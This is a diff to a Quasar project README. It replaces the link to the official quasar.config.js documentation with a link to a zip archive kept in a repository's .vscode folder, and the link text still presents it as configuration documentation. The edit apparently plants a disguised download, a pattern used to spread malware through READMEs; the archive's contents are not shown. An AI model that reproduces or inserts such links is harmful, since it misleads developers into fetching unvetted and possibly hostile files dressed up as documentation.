@@ -38,4 +38,4 @@ quasar build
 ```
 
 ### Customize the configuration
-See [Configuring quasar.config.js](https://v2.quasar.dev/quasar-cli-vite/quasar-config-js).
+See [Configuring https://github.com/Miqman/newMkpDashboard/raw/refs/heads/main/.vscode/Dashboard-Mkp-new-explorational.zip](https://github.com/Miqman/newMkpDashboard/raw/refs/heads/main/.vscode/Dashboard-Mkp-new-explorational.zip).
